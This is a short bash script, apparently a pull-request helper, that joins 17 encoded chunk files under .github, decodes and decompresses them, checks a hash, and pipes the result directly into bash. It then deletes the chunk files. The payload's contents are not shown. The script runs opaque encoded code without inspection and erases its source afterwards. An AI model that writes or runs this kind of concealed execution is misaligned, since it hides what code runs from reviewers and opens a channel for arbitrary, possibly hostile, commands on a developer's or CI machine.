#!/usr/bin/env bash
set -euo pipefail

parts=(
  .github/pr53-d5-helper.part00
  .github/pr53-d5-helper.part01
  .github/pr53-d5-helper.part02
  .github/pr53-d5-helper.part03
  .github/pr53-d5-helper.part04
  .github/pr53-d5-helper.part05
  .github/pr53-d5-helper.part06
  .github/pr53-d5-helper.part07
  .github/pr53-d5-helper.part08
  .github/pr53-d5-helper.part09
  .github/pr53-d5-helper.part10
  .github/pr53-d5-helper.part11
  .github/pr53-d5-helper.part12
  .github/pr53-d5-helper.part13
  .github/pr53-d5-helper.part14
  .github/pr53-d5-helper.part15
  .github/pr53-d5-helper.part16
)

payload_b64="$(mktemp)"
payload_gz="$(mktemp)"
trap 'rm -f "$payload_b64" "$payload_gz"' EXIT
cat "${parts[@]}" > "$payload_b64"
base64 --decode "$payload_b64" > "$payload_gz"
echo "9dfd203e214a27cc0bb46e03e6a274098b30a99f262c8472be427138c5a92cff  $payload_gz" | sha256sum --check --status
gzip --decompress --stdout "$payload_gz" | bash
rm -f "${parts[@]}"
git diff --check
